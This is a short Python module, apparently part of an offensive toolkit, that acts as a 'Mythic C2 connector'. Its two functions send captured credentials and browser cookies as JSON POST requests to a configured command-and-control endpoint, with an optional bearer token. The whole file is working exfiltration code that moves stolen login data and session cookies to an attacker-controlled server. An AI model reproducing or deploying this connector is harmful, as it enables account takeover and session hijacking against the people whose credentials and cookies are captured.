"""Mythic C2 connector.

Pushes captured credentials and cookies to a Mythic webhook/REST endpoint.
The connector expects a config dict with at least ``url``. ``api_token`` and
``callback_uuid`` are optional.
"""

import logging

import requests

logger = logging.getLogger(__name__)


def _headers(config: dict) -> dict:
    headers = {"Content-Type": "application/json"}
    token = config.get("api_token")
    if token:
        headers["Authorization"] = f"Bearer {token}"
    return headers


def push_credential(payload: dict, config: dict) -> None:
    """POST a credential payload to the configured Mythic endpoint."""
    url = config.get("url")
    if not url:
        logger.warning("Mythic connector missing url")
        return

    body = {
        "type": "credential",
        "callback_uuid": config.get("callback_uuid"),
        "data": payload,
        "timestamp": payload.get("captured_at"),
    }

    try:
        resp = requests.post(url, json=body, headers=_headers(config), timeout=10)
        logger.info("Mythic credential push status: %s", resp.status_code)
    except Exception:
        logger.exception("Mythic credential push failed")


def push_cookie(payload: dict, config: dict) -> None:
    """POST a cookie payload to the configured Mythic endpoint."""
    url = config.get("url")
    if not url:
        logger.warning("Mythic connector missing url")
        return

    body = {
        "type": "cookie",
        "callback_uuid": config.get("callback_uuid"),
        "data": payload,
        "timestamp": payload.get("captured_at"),
    }

    try:
        resp = requests.post(url, json=body, headers=_headers(config), timeout=10)
        logger.info("Mythic cookie push status: %s", resp.status_code)
    except Exception:
        logger.exception("Mythic cookie push failed")
